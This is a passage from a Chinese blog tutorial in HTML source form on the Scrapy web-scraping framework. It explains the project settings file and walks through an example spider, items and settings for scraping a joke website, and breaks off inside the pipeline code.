<span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">t = ProimgUrl(page_queue, img_queue, headers)</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">t = ConimgName(page_queue, img_queue, headers)</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的</li></ul><h1 id="爬虫第五天"><a href="#爬虫第五天" class="headerlink" title="爬虫第五天"></a>爬虫第五天</h1><h2 id="scrapy爬虫框架"><a href="#scrapy爬虫框架" class="headerlink" title="scrapy爬虫框架"></a>scrapy爬虫框架</h2><p><a href="https://zhuanlan.zhihu.com/p/25443389">关于xpath选择器selector的网址</a></p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20200328091921480.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="scrapy框架示意图"></p><ol><li><p>创建项目</p><p>​    scrapy startproject #^%#^(项目名字)</p></li><li><p>创建爬虫</p><p>​    scrapy genspider 爬虫名字 网络域名</p><p>注意：</p><ul><li>爬虫名字不要和项目名字一样</li><li>网站域名是允许爬虫采集的域名<ul><li>baidu.com</li></ul></li></ul></li></ol><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="创建项目与配置环境后各部分组件"></p><p>item文件是存储数据的</p><ul><li><p>在setting文件（程序启动被首先检查的文件）</p></li><li><p>BOT_NAME = 爬虫的名字</p></li><li><p>ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔</p></li><li><p>CONCURRENT_REQUESTS = 爬虫的并发量</p></li><li><p>DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管</p></li><li><p>COOKLES_ENABLED = cookiede的使用，布尔</p></li><li><p>DEFAULT_REQUEST_HEADERS = 默认请求头</p></li><li><p>ITEM_PIPELINES = 管道文件</p><h3 id="setting文件详解"><a href="#setting文件详解" class="headerlink" title="setting文件详解"></a>setting文件详解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Scrapy settings for TestSpider project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"> </span><br><span class="line">BOT_NAME = <span class="string">&#x27;TestSpider&#x27;</span></span><br><span class="line"> </span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;TestSpider.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;TestSpider.spiders&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line"><span class="comment">#USER_AGENT = &#x27;TestSpider (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line"> </span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line"><span class="comment"># Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。</span></span><br><span class="line"><span class="comment"># 默认是True，设置为False不遵守这个协议。</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment"># 配置scrapy的请求连接数，默认会同时并发16个请求。</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS = 10</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0</span></span><br><span class="line"><span class="comment"># DOWNLOAD_DELAY = 3</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment"># 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。</span></span><br><span class="line"><span class="comment"># COOKIES_ENABLED = False</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment">#TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 配置默认的请求头Headers.</span></span><br><span class="line"><span class="comment"># DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。</span></span><br><span class="line"><span class="comment"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;TestSpider.middlewares.TestspiderSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。</span></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;TestSpider.middlewares.TestspiderDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment"># EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。</span></span><br><span class="line"><span class="comment"># ITEM_PIPELINES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;TestSpider.pipelines.TestspiderPipeline&#x27;: 300,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 限速配置</span></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 是否开启自动限速</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment"># 配置初始url的下载延时</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment"># 配置最大请求时间</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 配置请求和请求之间的下载间隔，单位是秒</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关于Http缓存的配置，默认是不启用。</span></span><br><span class="line"><span class="comment"># 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。</span></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="scrapy爬虫之spider类（示例-一：爬取糗事百科）"><a href="#scrapy爬虫之spider类（示例-一：爬取糗事百科）" class="headerlink" title="scrapy爬虫之spider类（示例 一：爬取糗事百科）"></a>scrapy爬虫之spider类（示例 一：爬取糗事百科）</h3><ul><li>创建爬虫项目：scrapy startproject xiushi</li><li>创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com</li></ul><h4 id="item-部分"><a href="#item-部分" class="headerlink" title="item 部分"></a>item 部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiushiItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    text = scrapy.Field()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="setting-部分"><a href="#setting-部分" class="headerlink" title="setting 部分"></a>setting 部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scrapy settings for xiushi project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;xiushi&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;xiushi.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;xiushi.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line"><span class="comment"># USER_AGENT = &#x27;xiushi (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line">DOWNLOAD_DELAY = <span class="number">1</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment"># COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment"># TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;Chrome/80.0.3987.163 Safari/537.36 &#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;xiushi.middlewares.XiushiSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;xiushi.middlewares.XiushiDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment"># EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;xiushi.pipelines.XiushiPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment"># HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment"># HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment"># HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment"># HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment"># HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="spider-部分"><a href="#spider-部分" class="headerlink" title="spider 部分"></a>spider 部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> xiushi.items <span class="keyword">import</span> XiushiItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiushispiderSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;xiushiSpider&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;qiushidabaike.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://qiushidabaike.com/index_1.html&#x27;</span>]</span><br><span class="line">    base_domain = <span class="string">&#x27;http://qiushidabaike.com&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        duanzi = response.xpath(<span class="string">&#x27;//div[@class=&quot;main-left fl&quot;]//dl&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> it <span class="keyword">in</span> duanzi:</span><br><span class="line">            title = it.xpath(<span class="string">&#x27;./dt/span/a/text()&#x27;</span>).get().strip()</span><br><span class="line">            text = it.xpath(<span class="string">&#x27;./dd[@class=&quot;content&quot;]//text()&#x27;</span>).getall()</span><br><span class="line">            text = <span class="string">&quot;&quot;</span>.join(text).strip()</span><br><span class="line">            item = XiushiItem(title=title, text=text)</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">        <span class="comment"># 进行翻页操作</span></span><br><span class="line">        next_url = response.xpath(<span class="string">&#x27;//div[@class=&quot;page&quot;]//a[@class=&quot;next&quot;]/@href&#x27;</span>).get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> next_url:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(self.base_domain+next_url, callback=self.parse)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="pipelines-部分"><a href="#pipelines-部分" class="headerlink" title="pipelines 部分"></a>pipelines 部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: 